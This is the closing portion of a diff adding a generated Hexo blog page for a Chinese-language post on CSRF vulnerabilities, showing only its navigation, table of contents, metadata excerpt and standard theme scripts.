+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+          
+            cookie和session
+          
+        </h3>
+      </div>
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg" data-sizes="auto" alt="SRC漏洞挖掘学习" class="lazyload">
+        
+      
+      <a href="/en/2024/08/29/src-lou-dong-wa-jue-xue-xi/"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+        
+          SRC漏洞挖掘学习
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2024-2025
+      
+      <span class="footer-info-sep "></span>
+      mX1@0
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        203.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        12:28
+      </div>
+    
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">CSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">CSRF原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E5%88%86%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">CSRF分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%99%E5%A4%96%E5%92%8C%E7%AB%99%E5%86%85"><span class="toc-number">1.2.1.</span> <span class="toc-text">站外和站内</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E5%92%8CXSS%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.4.</span> <span class="toc-text">CSRF和XSS的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF%E4%BE%8B%E5%AD%90"><span class="toc-number">1.5.</span> <span class="toc-text">攻击场景例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C"><span class="toc-number">1.6.</span> <span class="toc-text">攻击实验</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%AE%8C%E6%88%90CSRF%E6%94%BB%E5%87%BB%E5%88%A0%E9%99%A4%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%EF%BC%88GET%E8%AF%B7%E6%B1%82%EF%BC%89"><span class="toc-number">1.6.1.</span> <span class="toc-text">自解压文件完成CSRF攻击删除网站数据（GET请求）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EPOST%E8%AF%B7%E6%B1%82%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%88%9B%E5%BB%BA"><span class="toc-number">1.6.2.</span> <span class="toc-text">基于POST请求的账号创建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81"><span class="toc-number">1.6.3.</span> <span class="toc-text">修改密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#referer%E8%AF%B7%E6%B1%82%E5%A4%B4%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.4.</span> <span class="toc-text">referer请求头防御和绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#token%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.5.</span> <span class="toc-text">token的防御和绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRFtester%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">1.7.</span> <span class="toc-text">CSRFtester工具使用</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/%E5%9B%BE1.jpg" data-sizes="auto" alt="mX1@0" class="lazyload">
+  <div class="sidebar-author-name">mX1@0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">64</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">18</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">25</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/archives" aria-label="归类"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归类</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/friend" aria-label="链接"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">链接</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "mX1@0",
+          title: "CSRF漏洞",
+          url: "http://example.com/2024/09/04/csrf-lou-dong/",
+          excerpt: "",
+          description: "",
+          stripContent: "CSRF漏洞CSRF原理CSRF（Cross-Site Request Forgery，跨站请求伪造） 主要涉及到攻击者利用受害者尚未失效的身份认证信息（如cookie、会话令牌等），通过诱导用户点击恶意链接或访问包含攻击代码的页面，从而在用户不知情的情况下以受害者的身份向服务器发送请求，完成非法操作（如转账、修改密码等）     CSRF分类站外和站内 站内  CSRF站内类型的漏洞在一定程度上是由于程序员滥用$_REQUEST类变量造成的。在一些敏感的操作中(如修改密码、添加用户等)，本来要",
+          date: "Wed Sep 04 2024 11:42:00 GMT+0800",
+          updated: "Thu Sep 12 2024 09:26:46 GMT+0800",
+          cover: "/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.9.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
